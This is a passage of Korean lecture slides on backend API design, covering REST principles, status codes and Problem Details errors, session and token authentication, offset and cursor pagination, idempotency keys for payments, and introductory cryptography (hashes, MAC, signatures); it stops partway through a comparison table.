API를 약속으로 설계하기

6장에서는 요청이 Filter와 DispatcherServlet을 지나 컨트롤러에 닿는 길을 따라갔습니다. 이 부에서는 그 컨트롤러가 바깥에 내놓는 주소와 응답을 어떤 규칙으로 정해야 오래 버티는지, 그리고 요청을 보낸 사람이 누구인지 서버가 어떻게 알아보는지를 봅니다.

API는 프로그램끼리 맺는 공개 계약이다

API는 한 프로그램이 다른 프로그램에게 "이 주소로 이런 모양의 요청을 보내면 이런 응답을 주겠다"고 내놓은 약속입니다. 이 장에서는 HTTP로 주고받는 웹 API만 다룹니다.

이 장 내내 작은 쇼핑몰 모아마켓을 예로 씁니다. 6장에서 만든 Spring 서버가 api.shop.com에서 주문 API를 열고, 웹 화면, 모바일 앱, 제휴 업체가 이를 호출합니다.

모바일 앱은 사용자가 업데이트하지 않으면 옛 코드가 몇 달씩 돕니다. 그래서 API는 한번 내놓으면 마음대로 바꿀 수 없는 계약이 되고, 처음부터 예측 가능하게 설계해야 합니다.

REST는 웹이 커질 수 있었던 이유를 정리한 것이다

API를 만드는 사람마다 주소와 동작을 제멋대로 정하면, 호출하는 쪽은 API마다 새 규칙을 익혀야 하고 캐시나 프록시 같은 중간 장치도 요청의 뜻을 짐작할 수 없습니다. 그래서 널리 따르는 공통 원칙이 필요했습니다.

그 원칙으로 가장 많이 쓰이는 것이 REST입니다. HTTP 명세를 함께 쓴 Roy Fielding이 2000년 박사 논문에서 "웹이 이렇게 크게 자랄 수 있었던 설계상의 이유"를 여섯 가지 제약 조건으로 정리하고 붙인 이름입니다. 표준 문서나 프로토콜이 아니라 아키텍처 스타일, 즉 "이 제약을 지키면 이런 성질을 얻는다"는 설계 원칙의 묶음입니다.

이름의 뜻을 풀면 이렇습니다. 서버가 관리하는 대상, 예를 들어 "42번 주문"이 리소스입니다. 클라이언트가 실제로 받는 것은 리소스 자체가 아니라 그 순간 상태를 JSON 같은 형식으로 옮긴 표현입니다. 클라이언트는 표현을 받아 보고, 표현을 보내 상태를 바꿉니다. "표현을 주고받으며 상태를 옮긴다"가 REST라는 이름입니다.

다음 슬라이드에서 여섯 제약이 각각 무엇을 요구하고 왜 그런 요구를 하는지 봅니다.

여섯 제약은 각자 얻으려는 성질이 있다

Client-Server: 화면을 그리는 쪽과 데이터를 다루는 쪽을 나눕니다. 그래야 모아마켓이 앱 화면을 바꿔도 서버를 건드리지 않고, 서버 DB를 바꿔도 앱이 모릅니다.

Stateless: 요청 하나에 처리에 필요한 정보를 모두 담고, 서버는 요청 사이에 클라이언트 상태를 기억하지 않습니다. 2장에서 본 HTTP의 무상태가 여기서 나왔습니다. 어느 서버가 받아도 처리할 수 있으니 서버를 늘리기 쉽습니다.

Cacheable: 응답마다 재사용해도 되는지를 밝힙니다. 그래야 브라우저나 중간 캐시가 같은 요청을 서버까지 보내지 않습니다.

Layered System: 클라이언트는 자기가 서버와 직접 말하는지, 중간의 프록시나 게이트웨이와 말하는지 몰라도 됩니다. 그래서 보안 장치나 캐시를 나중에 끼울 수 있습니다.

Uniform Interface: 모든 리소스를 같은 방식으로 다룹니다. 리소스는 URI로 가리키고, 조작은 GET, POST 같은 표준 메서드로 합니다. REST의 핵심이며 이 부의 설계 규칙 대부분이 여기서 나옵니다.

Code-on-Demand(선택): 서버가 실행할 코드를 내려보낼 수 있습니다. 웹 페이지의 JavaScript가 그 예이며, API 설계에서는 거의 쓰지 않습니다.

실무의 "RESTful"은 두 제약을 지킨다는 뜻이다

제약 조건요구하는 것얻는 것
Client-Server화면과 데이터 처리를 분리양쪽을 독립적으로 발전
Stateless요청마다 필요한 정보를 모두 담음아무 서버나 처리, 확장 쉬움
Cacheable응답에 캐시 가능 여부를 표시중간 계층이 응답 재사용
Layered System중간 계층을 끼울 수 있음보안, 캐시 계층 추가
Uniform InterfaceURI로 가리키고 표준 메서드로 조작누구나 같은 방식으로 호출
Code-on-Demand실행 코드를 내려줌(선택)클라이언트 기능 확장

Fielding은 Uniform Interface의 일부로 HATEOAS, 즉 응답에 "다음에 할 수 있는 동작"의 링크를 담으라고까지 요구합니다. 하지만 앱은 화면 흐름을 코드에 미리 정해 두므로 링크를 따라 움직이지 않고, 그래서 실무 API는 대부분 여기까지 가지 않습니다. 보통 "RESTful하다"는 말은 Stateless와 Uniform Interface를 지킨다는 뜻입니다.

URI는 명사로, 동작은 메서드로 말한다

# 피해야 할 모양: 동사가 URI에 들어감
POST /getOrders
POST /createOrder
GET  /deleteOrder?id=42

# 리소스 중심: 명사(복수형) + 메서드
GET    /orders            # 목록
POST   /orders            # 생성
GET    /orders/42         # 단건
PATCH  /orders/42         # 일부 수정
DELETE /orders/42         # 삭제
GET    /users/7/orders    # 소속 관계
GET    /orders?status=PAID&sort=-createdAt

Uniform Interface를 지키면 URI는 리소스의 이름만 담고, 무엇을 할지는 메서드가 정합니다. 2장에서 GET은 안전(상태를 바꾸지 않음)하고 PUT, DELETE는 멱등(여러 번 보내도 결과가 같음)하다고 봤습니다. 캐시와 프록시는 이 성질을 믿고 GET을 재사용하거나 재전송합니다.

그런데 GET /deleteOrder?id=42는 GET인데 삭제합니다. 미리 읽기 기능이 링크를 한 번 열어 보기만 해도 주문이 지워집니다.

CRUD로 안 떨어지는 동작은 상태나 하위 리소스로 본다

앞 슬라이드 마지막 줄의 ? 뒤를 쿼리 문자열이라고 합니다. 리소스를 가리키는 경로와 달리, 같은 목록을 어떻게 걸러 보고 정렬할지 같은 조건을 담습니다. sort=-createdAt의 마이너스는 내림차순을 뜻하는 흔한 관례입니다.

목록 아래 /users/7/orders처럼 경로를 이어 쓰면 "7번 회원에게 속한 주문"이라는 소속 관계를 표현합니다. 다만 단계가 셋을 넘으면 주소가 길고 깨지기 쉬우니, 주문처럼 자기 ID가 있는 리소스는 /orders/42로 바로 가리키는 편이 낫습니다.

어려운 것은 "주문 취소"처럼 생성, 조회, 수정, 삭제(CRUD) 어느 것에도 딱 맞지 않는 동작입니다. 이때는 동사를 URI에 넣지 말고 무엇이 바뀌는가로 생각합니다.

주문의 상태값만 CANCELED로 바뀐다면 PATCH /orders/42에 {"status":"CANCELED"}를 보냅니다. 취소 사유, 환불 금액, 처리 시각처럼 취소 자체가 기록으로 남는다면 취소를 별도 리소스로 보고 POST /orders/42/cancellation으로 만듭니다. 이렇게 상위 리소스 아래에 딸린 리소스를 하위 리소스라고 합니다.

상태 코드는 클라이언트의 다음 행동을 정한다

2장에서 상태 코드의 첫 자리가 책임 소재라고 봤습니다. 2xx는 성공, 4xx는 요청한 쪽의 잘못, 5xx는 서버 쪽 잘못입니다. API 설계에서 이 숫자가 중요한 이유는 사람이 아니라 프로그램이 이 숫자를 보고 다음 행동을 정하기 때문입니다.

모아마켓 앱은 4xx를 받으면 "다시 보내도 똑같이 실패하니 사용자에게 고치라고 알린다"로, 5xx를 받으면 "잠시 뒤 다시 시도해 볼 수 있다"로 판단합니다. 모니터링 시스템은 5xx 비율로 장애를 감지하고, 캐시는 2xx만 저장합니다.

그래서 흔히 보는 "모든 응답을 200으로 주고 본문의 success: false로 실패를 알리는" 방식은 이 장치들을 모두 속입니다. 모니터링에는 장애가 성공으로 잡히고, 캐시는 실패 응답을 저장하며, 재시도 로직은 실패를 알아채지 못합니다.

다음 슬라이드에서 주문 API에서 자주 고민하는 상황별 코드를 정리합니다.

400과 422는 "형식"과 "규칙"으로 나눈다

본문이 JSON으로 읽히지 않거나 필수 필드가 빠졌다면 400입니다. 형식은 맞지만 "재고보다 많이 주문"처럼 업무 규칙에 어긋나면 422를 씁니다. 201에는 새 리소스 주소를 Location 헤더에 싣고, 429에는 몇 초 뒤 다시 오라는 Retry-After 헤더를 붙입니다.

상황코드클라이언트가 할 일
주문 생성 성공201 + Location새 주문 주소로 이동
본문 형식이 틀림400요청을 고쳐서 재전송
형식은 맞지만 규칙 위반422입력값을 사용자에게 다시 받음
상태 충돌(중복, 버전)409최신 상태를 다시 읽고 판단
요청이 너무 많음429Retry-After만큼 기다림
서버 오류500 / 503멱등 요청만 재시도

에러 응답은 표준 포맷 하나로 통일한다

HTTP/1.1 422 Unprocessable Content
Content-Type: application/problem+json

{
  "type": "https://api.shop.com/errors/stock",
  "title": "재고가 부족합니다",
  "status": 422,
  "detail": "상품 381의 재고는 2개입니다",
  "instance": "/orders/req-9f2c",
  "code": "OUT_OF_STOCK"
}

상태 코드만으로는 "왜" 실패했는지 모릅니다. 그렇다고 엔드포인트마다 에러 본문 모양이 다르면 클라이언트 분기 코드가 끝없이 늘어납니다. 인터넷 표준 문서인 RFC 9457 Problem Details가 공통 모양을 정해 두었습니다(2023년 RFC 7807을 대체).

type은 에러 종류의 고유 식별자, title은 종류의 짧은 이름, detail은 이번 사례의 설명, instance는 이번 발생 건을 가리킵니다. code처럼 필드를 더해도 됩니다.

에러 포맷은 예외 처리 한곳에서 만든다

@RestControllerAdvice
class ApiExceptionHandler {
  @ExceptionHandler(OutOfStockException.class)
  ProblemDetail stock(OutOfStockException e) {
    var p = ProblemDetail.forStatusAndDetail(
        HttpStatusCode.valueOf(422), e.getMessage());
    p.setType(URI.create(STOCK_ERROR_URI));
    p.setTitle("재고가 부족합니다");
    p.setProperty("code", "OUT_OF_STOCK");
    return p;
  }
}

6장에서 컨트롤러가 던진 예외를 @ControllerAdvice가 받아 응답으로 바꾼다고 봤습니다. 에러 포맷을 그곳 한 군데서 만들면 모든 엔드포인트가 같은 모양을 냅니다.

Spring 6부터 있는 ProblemDetail 클래스를 돌려주면(STOCK_ERROR_URI는 앞 슬라이드의 type 주소를 담은 상수) Spring이 본문을 위 JSON으로 바꾸고 Content-Type을 application/problem+json으로 붙입니다. 서비스 코드는 업무 예외만 던지면 됩니다.

인증은 누구인지, 인가는 무엇을 해도 되는지

지금까지는 주문 API의 모양을 정했습니다. 남은 질문은 "누가 이 API를 불러도 되는가"입니다. 7번 회원이 GET /orders/42를 보냈다면 서버는 두 가지를 차례로 확인합니다.

먼저 인증, 즉 요청한 주체가 정말 7번 회원인지 비밀번호나 토큰으로 확인합니다. 다음은 인가, 즉 확인된 7번 회원이 42번 주문을 볼 권한이 있는지 판단합니다. 누구인지 모르면 권한을 따질 수 없으니 순서는 항상 인증이 먼저입니다.

상황코드
토큰이 없거나 만료됨401 Unauthorized
로그인했지만 권한 없음403 Forbidden
남의 주문 존재를 숨김404 Not Found
 401은 이름과 달리 "인증 실패"입니다. 어떤 방식으로 인증하라는 안내를 WWW-Authenticate 헤더에 실어야 합니다(RFC 9110). 주문 번호를 하나씩 넣어 보며 존재 여부를 캐는 것을 막으려면 403 대신 404를 줍니다.

세션 방식은 서버가 로그인 상태를 기억한다

브라우저모아마켓 서버
POST /login 아이디, 비밀번호 세션 생성
쿠키 보관 Set-Cookie SESSION=8f3a저장소: 8f3a → 회원 7
GET /orders Cookie: SESSION=8f3a 저장소 조회
200 회원 7의 주문 목록

2장에서 본 쿠키와 세션 ID가 가장 오래된 방법입니다. 로그인에 성공하면 서버는 "8f3a는 회원 7"이라고 자기 저장소에 기록하고, 브라우저는 그 ID를 쿠키로 매 요청에 실어 옵니다.

로그아웃은 저장소에서 지우면 끝이라 단순합니다. 대신 요청마다 조회가 필요하고, 서버가 여러 대면 모든 서버가 같은 저장소를 봐야 합니다(8장).

토큰 방식은 요청이 스스로를 증명한다

세션 방식에서 서버가 조회를 하는 이유는 "SESSION=8f3a"라는 값 자체에는 아무 정보도 없기 때문입니다. 그렇다면 발상을 뒤집어, 값 안에 "나는 회원 7이고 15분 뒤 만료된다"는 내용을 직접 적어서 주면 어떨까요? 서버는 저장소를 볼 필요가 없습니다.

문제는 위조입니다. 클라이언트가 "회원 7"을 "회원 1"로 고쳐 보내면 그만입니다. 그래서 서버는 내용 옆에 자기만 만들 수 있는 서명을 붙여 줍니다. 서명은 내용이 한 글자라도 바뀌면 맞지 않게 되는 값이라, 서버는 서명이 맞는지만 계산해 보면 내용을 믿을 수 있습니다. 서명이 어떻게 이런 성질을 갖는지는 3부 암호 기법에서 봅니다.

이렇게 서버가 서명해서 내준 증명서를 토큰이라고 하고, 이 토큰을 만드는 표준 형식이 JWT입니다. 지금은 "서명이 붙은 JSON 증명서" 정도로 알아 두면 되고, 구조와 검증 과정은 4부에서 자세히 봅니다.

내용을 서버가 아니라 토큰이 들고 다닌다는 차이는 확장, 로그아웃, 크기 모두에서 결과를 바꿉니다. 다음 슬라이드에서 나란히 비교합니다.

2부

데이터가 움직여도, 요청이 반복돼도 맞아야 한다

1부의 규칙대로 만든 API도 두 가지 현실 앞에서 틀린 결과를 낼 수 있습니다. 목록은 사용자가 보는 사이에도 바뀌고, 네트워크는 응답을 잃어버립니다. 모아마켓의 상품 목록과 결제 API로 두 문제가 왜 생기고 어떻게 막는지 봅니다.

기초 원리 여기부터는 DB 쿼리와 서버 저장소 수준에서 왜 그렇게 동작하는지 봅니다.

목록은 나눠서 주고, 가장 쉬운 방법은 offset이다

-- 신상품 목록 2페이지 (한 페이지 5건)
SELECT * FROM product
ORDER BY created_at DESC
LIMIT 5 OFFSET 5;

-- API 모양
GET /products?page=2&size=5

모아마켓 상품이 10만 개라면 한 번에 다 줄 수 없습니다. 응답이 수십 MB가 되고 DB와 앱 모두 느려집니다. 그래서 목록은 조각으로 나눠 주는데, 이를 페이지네이션이라고 합니다.

가장 쉬운 방법은 offset 방식입니다. LIMIT 5는 5건만 달라는 뜻이고, OFFSET 5는 정렬된 결과의 앞 5건을 건너뛰라는 뜻입니다. page와 size만 있으면 계산되니 구현이 쉽습니다. 문제는 두 가지인데, 하나는 데이터가 움직일 때 드러납니다.

offset은 새 데이터가 들어오면 밀린다

사용자가 1페이지(상품 10~6)를 보는 사이 새 상품 11이 등록됐다고 합시다. 2페이지 요청은 "앞의 5건을 건너뛰라"인데, 이제 앞 5건은 11~7입니다. 그래서 2페이지 첫 줄에 이미 본 상품 6이 다시 나옵니다.

반대로 그사이 상품이 하나 삭제되면 모든 행이 한 칸씩 당겨져 한 건을 보지 못하고 지나칩니다. offset은 "몇 번째"라는 위치를 기억하는데, 위치는 데이터가 바뀌면 다른 행을 가리키기 때문입니다.

offset은 깊은 페이지일수록 느려진다

두 번째 문제는 성능입니다. OFFSET 100000은 "10만 건을 건너뛰라"이지만 DB는 건너뛸 10만 건을 실제로 하나씩 읽은 뒤 버립니다. 1페이지는 5건을 읽고 2만 페이지는 10만 5건을 읽으니, 뒤 페이지일수록 응답 시간이 길어집니다.

왜 바로 10만 번째로 건너뛰지 못할까요? 4장에서 본 B+Tree 인덱스를 떠올려 봅시다. 인덱스는 정렬된 키를 여러 단으로 나눠 두고, 위에서부터 키 값을 비교하며 내려가 원하는 값의 위치를 찾는 구조입니다. 그래서 "이 값이 어디 있나"는 몇 단만 내려가면 찾지만, 각 노드는 자기 아래에 행이 몇 개 있는지 세어 두지 않으므로 "10만 번째 행이 어디 있나"는 맨 앞 리프부터 차례로 세는 수밖에 없습니다.

여기서 해결의 실마리가 보입니다. 위치(몇 번째)로 찾으면 느리고 밀리지만, 값으로 찾으면 빠르고 데이터가 바뀌어도 같은 지점을 가리킵니다. 그렇다면 "몇 번째부터"가 아니라 "마지막으로 본 값 다음부터"를 달라고 하면 됩니다. 이것이 다음 슬라이드의 cursor 방식입니다.

cursor는 "어디서부터"를 값으로 기억한다

-- offset: 앞의 N행을 읽고 버림
SELECT * FROM product
ORDER BY created_at DESC, id DESC
LIMIT 20 OFFSET 100000;

-- cursor: 마지막으로 본 행 다음부터
SELECT * FROM product
WHERE (created_at, id) < (:lastAt, :lastId)
ORDER BY created_at DESC, id DESC
LIMIT 20;

-- 인덱스: (created_at, id)

cursor 방식은 마지막으로 본 행의 정렬 키 값을 기준점(cursor)으로 넘깁니다. DB는 인덱스에서 그 값을 바로 찾아 20건만 읽으므로 몇 번째 페이지든 속도가 같습니다.

created_at이 같은 상품이 있을 수 있어 id를 덧붙여 순서를 유일하게 만듭니다. (a, b) < (x, y)는 a를 먼저 비교하고 같으면 b를 비교하는 사전식 비교입니다. 4장의 복합 인덱스 (created_at, id)가 바로 이 순서로 정렬돼 있습니다.

cursor 값은 클라이언트가 해석하지 못하게 감싼다

{
  "items": [ … 상품 20건 … ],
  "nextCursor": "eyJhdCI6IjIwMjYtMTEtMTgi…",
  "hasNext": true
}

# 다음 요청
GET /products?size=20&cursor=eyJhdCI6…

서버는 마지막 행의 created_at과 id를 JSON으로 묶고 Base64로 인코딩해 nextCursor로 줍니다. Base64는 임의의 바이트를 영문자, 숫자, 기호 64종만으로 적는 표기법으로, 주소에 넣어도 깨지지 않게 하려고 씁니다. 암호화가 아니라 누구나 되돌릴 수 있습니다.

그래도 감싸는 이유는 클라이언트가 내부 구조에 의존하지 않게 하려는 것입니다. 정렬 기준이 바뀌어 cursor 내용이 달라져도 클라이언트는 받은 값을 그대로 돌려주기만 하면 됩니다.

두 방식은 화면 요구사항으로 고른다

cursor가 항상 나은 것은 아닙니다. 값으로 이어 가므로 "7페이지로 바로 가기"는 할 수 없고, 정렬 기준마다 맞는 인덱스가 있어야 합니다. 그래서 화면이 무엇을 요구하는지로 고릅니다.

항목offsetcursor
임의 페이지 이동가능(7페이지로 점프)불가, 앞뒤로만 이동
깊은 페이지 성능갈수록 느려짐일정함
데이터 변경 중 정확성중복이나 누락 발생밀리지 않음
정렬 조건자유로움인덱스와 맞는 유일한 키 필요
어울리는 화면관리자 표, 검색 결과무한 스크롤, 피드, 동기화

"전체 몇 건" 표시에 쓰는 COUNT(*)도 큰 테이블에서는 전체를 세야 해서 비쌉니다. 무한 스크롤이라면 개수 대신 다음이 있는지만 알리는 hasNext로 충분합니다.

응답을 잃어버린 재시도가 결제를 두 번 한다

모아마켓 앱결제 API
POST /payments 10,000원 카드 승인
타임아웃 201 Created응답이 네트워크에서 유실됨
POST /payments 재시도 또 승인
사용자 카드에서 20,000원이 빠져나감

이제 두 번째 현실, 응답 유실입니다. 앱은 정해진 시간 안에 응답이 없으면 기다림을 멈추는데 이를 타임아웃이라 합니다. 타임아웃은 "실패"가 아니라 "결과를 모름"입니다. 서버가 처리했는지 알 수 없습니다.

2장에서 멱등한 요청만 안심하고 다시 보낼 수 있다고 했습니다. POST는 멱등이 아니어서 다시 보내면 새 결제가 또 생깁니다.

같은 요청인지 판단하려면 요청에 이름표가 필요하다

서버가 중복을 걸러 내면 될 것 같지만, 무엇을 기준으로 "같은 요청"이라고 판단할까요? 본문이 같다는 것만으로는 안 됩니다. 사용자가 같은 1만 원짜리 상품을 일부러 두 번 사는 것도 정상이기 때문입니다. 서버는 본문만 보고는 재시도와 새 주문을 구분할 수 없습니다.

그 구분을 확실히 아는 쪽은 클라이언트입니다. 앱은 자기가 지금 "같은 결제를 다시 시도"하는지 "새 결제를 시작"하는지 압니다. 그러니 앱이 결제 시도 하나마다 고유한 이름표를 만들어 요청에 붙이고, 재시도할 때는 같은 이름표를 다시 쓰면 됩니다. 서버는 이름표만 보고 판단합니다.

이름표로는 보통 UUID를 씁니다. 128비트 무작위 값이라 따로 조율하지 않고 각자 만들어도 겹칠 확률이 사실상 없습니다. 이 이름표를 담는 헤더가 Idempotency-Key입니다. 결제 대행 회사 Stripe가 자기 API에서 먼저 썼고, 지금은 인터넷 표준을 만드는 IETF에서 표준 초안으로 다듬고 있습니다.

다음 슬라이드에서 서버가 이 키를 받아 처리하는 순서를 봅니다.

Idempotency-Key는 결과를 저장했다가 되돌려준다

  1. 키 생성

    앱이 결제 시도마다 UUID를 만들어 Idempotency-Key 헤더에 싣습니다.

  2. 키 선점

    서버가 키를 "처리 중"으로 저장하는 데 성공한 경우에만 결제를 실행합니다.

  3. 결과 저장

    상태 코드와 응답 본문을 키에 붙여 "완료"로 바꿉니다.

  4. 같은 키 재요청

    다시 실행하지 않고 저장해 둔 응답을 그대로 돌려줍니다.

  5. 예외 응답

    아직 처리 중이면 409, 같은 키에 다른 본문이면 422로 거절합니다.

핵심은 재시도 여부를 서버가 판단할 수 있게 요청에 정체성을 붙이는 것입니다. 키가 같으면 같은 의도이므로 결과도 같아야 하고, 그래서 처음 결과를 저장해 두었다 돌려줍니다.

409는 첫 요청이 아직 끝나지 않았으니 잠시 뒤 다시 오라는 뜻이고, 422는 키를 다른 결제에 잘못 재사용했다는 뜻입니다. 두 응답 모두 IETF 초안의 권고입니다.

"조회 후 저장"은 동시에 온 두 요청을 놓친다

CREATE TABLE idempotency_key (
  idem_key     VARCHAR(64),
  user_id      BIGINT,
  request_hash CHAR(64),    -- 본문 해시
  status       VARCHAR(16), -- PROCESSING/DONE
  response     JSON,
  created_at   TIMESTAMP,
  PRIMARY KEY (user_id, idem_key)
);
-- INSERT에 성공한 요청만 결제를 실행
-- 같은 키 INSERT는 키 중복으로 즉시 실패

2단계 "선점"을 "키가 있나 조회하고, 없으면 저장"으로 짜면 안 됩니다. 앱이 재시도를 빠르게 두 번 보내면 두 요청이 거의 동시에 조회해 둘 다 "없음"을 보고 결제합니다. 1장에서 본 경쟁 상태입니다.

그래서 확인과 저장을 쪼갤 수 없는 한 동작으로 합칩니다. 4장의 유니크 제약이 걸린 키로 INSERT하면 DB가 둘 중 하나만 성공시킵니다.

키는 사용자 단위로, 보관은 기한을 두고

앞 슬라이드 표의 나머지 설계에도 이유가 있습니다. 기본 키가 (user_id, idem_key)인 것은 키의 범위를 사용자별로 나누려는 것입니다. 다른 사용자가 우연히, 또는 일부러 같은 키를 보내도 남의 결제 결과를 받아 가지 못합니다.

request_hash는 요청 본문을 해시 함수에 넣어 얻은 고정 길이 값입니다. 해시는 3부에서 자세히 보는데, 지금은 "본문이 조금만 달라도 완전히 다른 값이 나오는 지문"으로 알아 두면 됩니다. 같은 키로 온 요청의 지문이 처음과 다르면 422로 거절합니다.

DB 대신 메모리 기반 키-값 저장소인 Redis를 쓴다면 "키가 없을 때만 저장"하는 SET NX 명령이 같은 역할을 합니다. Redis는 8장에서 자세히 다룹니다.

결제 처리 중 서버가 5xx로 실패했다면 키를 지워 다음 재시도가 처음부터 다시 실행되게 하는 편이 보통입니다. 키는 영원히 둘 필요가 없습니다. 재시도는 몇 초에서 몇 시간 안에 일어나므로 그 기간만 보관하면 되고, Stripe는 24시간이 지난 키를 정리합니다.

3부

토큰과 비밀번호를 지키는 암호 도구들

1부에서 토큰은 "서명 덕분에 위조할 수 없다"고 했고, 2부에서는 본문의 "해시"를 지문처럼 썼습니다. 이 부에서는 그 말들이 정확히 무엇을 뜻하는지 정리합니다. 2장에서 TLS가 암호 기법을 어떻게 조합하는지 봤다면, 여기서는 도구 하나하나가 무엇을 보장하고 무엇을 보장하지 않는지를 원리로 봅니다. 4부의 JWT와 이 부 끝의 비밀번호 저장이 모두 이 위에 섭니다.

보안 도구는 세 가지 서로 다른 질문에 답한다

"암호화했으니 안전하다"는 말은 반만 맞습니다. 모아마켓이 지켜야 하는 것은 사실 서로 다른 세 가지이고, 도구마다 답하는 질문이 다르기 때문입니다.

기밀성은 "허락받지 않은 사람이 내용을 읽을 수 없는가"입니다. 카드 번호가 네트워크를 지날 때 엿보는 사람이 읽지 못해야 합니다.

무결성은 "도중에 내용이 바뀌지 않았는가"입니다. 토큰의 "회원 7"이 "회원 1"로 바뀌었다면 알아챌 수 있어야 합니다. 내용을 숨기는 것과는 별개의 문제입니다. 모두가 읽을 수 있어도 바뀌지 않았음은 보장할 수 있습니다.

출처 인증은 "이것을 정말 그 사람이 만들었는가"입니다. 토큰이 모아마켓 서버가 발급한 것인지, 누군가 그럴듯하게 만든 것인지 가려야 합니다.

이제부터 볼 대칭키 암호, 비대칭키 암호, 해시, MAC, 전자 서명은 이 셋 중 일부씩을 맡습니다. 슬라이드마다 "이 도구는 어느 질문에 답하는가"를 기준으로 읽으면 헷갈리지 않습니다.

대칭키 암호는 빠르지만 키를 건네기 어렵다

기밀성을 얻는 가장 오래된 방법은 대칭키 암호입니다. 보내는 쪽과 받는 쪽이 같은 비밀키 하나를 나눠 갖고, 그 키로 잠그고(암호화) 같은 키로 엽니다(복호화). 키 없이 암호문만 본 사람은 내용을 알 수 없습니다.

오늘날 표준은 AES이고, AES 전용 하드웨어 명령이 없는 모바일 기기에서는 ChaCha20도 많이 씁니다. 연산이 비트를 섞고 자리를 바꾸는 단순한 단계의 반복이라 매우 빠릅니다. 요즘 CPU는 AES를 전용 명령으로 처리해 코어 하나가 초당 기가바이트 단위를 암호화합니다. 그래서 실제 데이터는 거의 언제나 대칭키로 암호화합니다.

약점은 키를 나누는 일입니다. 모아마켓 서버와 처음 접속한 사용자의 브라우저가 같은 키를 가지려면 어딘가로 키를 보내야 하는데, 그 통로가 아직 암호화되지 않았다면 키를 엿본 사람이 이후 모든 통신을 엽니다. 처음 만난 상대와 비밀키를 안전하게 나눌 방법이 없다는 것이 대칭키의 근본 한계이고, 이를 푼 것이 다음 슬라이드의 비대칭키입니다.

비대칭키는 한 쌍의 키로 두 가지 일을 한다

비대칭키 암호(공개키 암호)는 수학적으로 짝을 이룬 두 키를 씁니다. 공개키는 누구에게나 나눠 주고, 개인키는 주인만 갖습니다. 한쪽 키로 처리한 것은 짝인 다른 키로만 풀 수 있고, 공개키에서 개인키를 계산해 내는 것은 현실적인 시간 안에 불가능합니다. 큰 수의 소인수분해나 타원 곡선 위의 이산 로그처럼 한 방향은 쉽고 반대 방향은 어려운 수학 문제를 쓰기 때문입니다.

이 성질로 두 가지 일을 합니다. 첫째, 공개키로 잠그면 개인키 주인만 엽니다. 처음 만난 상대에게도 공개키를 건네받아 비밀을 보낼 수 있으니 대칭키의 키 전달 문제가 풀립니다. 둘째, 개인키로 만든 값은 공개키로 누구나 확인할 수 있지만 개인키 주인만 만들 수 있습니다. 이것이 뒤에서 볼 전자 서명입니다.

대표 알고리즘은 RSA(암호화와 서명), ECDSA(타원 곡선 서명), ECDH(타원 곡선 키 합의)입니다. 대가는 속도입니다. 큰 수 연산이라 대칭키보다 수백 배 이상 느려 큰 데이터를 직접 암호화하지 않습니다.

그래서 2장의 TLS는 비대칭으로 대칭키를 합의하고, 데이터는 대칭으로 암호화합니다. 둘의 약점을 서로 메운 조합입니다.

두 방식 모두 기밀성을 위한 도구입니다. 그런데 토큰에 필요한 것은 기밀성이 아니라 무결성과 출처 인증이었습니다. 토큰 내용은 사용자가 봐도 되지만 바뀌어서는 안 되니까요. 이 두 질문에 답하는 도구가 해시에서 출발합니다.

암호학적 해시는 되돌릴 수 없는 지문이다

$ printf 'amount:10000' | sha256sum
aa11c8aa…cc914bac  # 16진수 64자리

$ printf 'amount:10001' | sha256sum
b4a49418…6b13f8aa  # 한 글자 차이

3장의 해시 테이블에서 해시 함수는 키를 버킷 번호로 바꾸는, 빠르고 고르게 퍼지는 함수였습니다. 보안에 쓰는 암호학적 해시는 여기에 세 성질을 더 요구합니다.

출력에서 입력을 되돌릴 수 없고(일방향), 같은 출력이 나오는 두 입력을 찾을 수 없으며(충돌 저항), 입력이 1비트만 달라도 출력이 완전히 바뀝니다. 대표가 SHA-256입니다.

해시만으로는 변조를 막지 못한다

해시로 무결성을 지킬 수 있을까요? 모아마켓 서버가 토큰 내용 옆에 그 내용의 SHA-256 값을 붙여 준다고 해 봅시다. 서버는 받은 내용을 다시 해시해 붙어 온 값과 비교하고, 다르면 변조로 판단합니다.

그런데 SHA-256은 공개된 함수라 누구나 계산할 수 있습니다. 공격자가 "회원 7"을 "회원 1"로 바꾸고 해시도 새로 계산해 붙이면 서버의 비교는 통과합니다. 해시가 무결성을 지켜 주는 경우는 소프트웨어 배포 사이트가 다운로드 파일의 해시를 따로 공개하는 것처럼, 비교할 원본 해시가 공격자 손이 닿지 않는 곳에 있을 때뿐입니다.

그러니 필요한 것은 공격자는 계산할 수 없고 서버만 계산할 수 있는 지문입니다. "서버만 계산할 수 있다"는 성질은 서버만 가진 비밀이 계산에 섞여야 나옵니다. 그 비밀이 대칭 비밀키면 MAC, 비대칭 개인키면 전자 서명입니다.

MAC은 비밀키를 섞은 해시다

  1. 키 공유

    발급하는 쪽과 검증하는 쪽이 같은 비밀키를 미리 나눠 갖습니다.

  2. MAC 계산

    보내는 쪽이 HMAC(비밀키, 메시지)를 계산해 메시지에 붙입니다.

  3. 재계산

    받는 쪽이 자기 키로 받은 메시지의 HMAC을 다시 계산합니다.

  4. 비교

    값이 같으면 키를 가진 쪽이 만든, 바뀌지 않은 메시지입니다.

MAC은 메시지와 비밀키를 함께 넣어 만든 지문입니다. 가장 널리 쓰는 구성이 해시 함수로 만든 HMAC이고, SHA-256을 쓰면 HMAC-SHA256입니다.

키를 모르는 공격자는 내용을 바꾼 뒤 맞는 MAC을 만들 수 없습니다. 다만 키를 나눠 가진 양쪽 모두 MAC을 만들 수 있으므로, 둘 중 누가 만들었는지는 구분하지 못합니다.

전자 서명은 만든 사람을 하나로 좁힌다

  1. 해시

    서명하는 쪽이 메시지의 해시를 계산합니다.

  2. 서명

    그 해시를 자기 개인키로 처리한 값이 서명이고, 메시지에 붙입니다.

  3. 검증

    받는 쪽은 서명자의 공개키로 서명과 메시지 해시가 짝이 맞는지 확인합니다.

  4. 결론

    맞으면 개인키 주인이 만든, 바뀌지 않은 메시지입니다.

전자 서명은 비대칭키의 두 번째 쓰임새입니다. 검증에 쓰는 공개키는 누구에게 줘도 되고, 공개키로는 서명을 만들 수 없습니다.

그래서 MAC과 달리 서명을 만들 수 있는 쪽이 개인키 주인 하나뿐입니다. 검증하는 쪽이 많아도 그들이 위조할 능력은 생기지 않습니다. 이 차이가 4부에서 HS256과 RS256을 가르는 기준이 됩니다.

해시, MAC, 서명, 암호화는 보장 범위가 다르다

도구만드는 방법보장보장하지 않음
해시SHA-256(데이터)원본 해시와 비교 시 변조 탐지누가 만들었는지

